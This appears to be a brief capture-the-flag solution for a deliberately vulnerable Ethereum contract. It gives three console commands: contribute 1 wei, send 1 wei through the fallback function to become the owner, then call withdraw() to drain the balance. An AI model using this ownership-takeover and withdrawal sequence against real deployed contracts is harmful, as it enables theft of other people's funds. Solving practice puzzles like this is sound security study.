Solution
========

1. await contract.contribute({value:1}) --> send 1 wei to the contract to make sure contributions[msg.sender] > 0
2. await contract.sendTransaction({value:1}) --> send 1 wei using the fallback function --> now we own the contract!
3. await contract.withdraw() --> reduce balance to 0 --> SOLVED
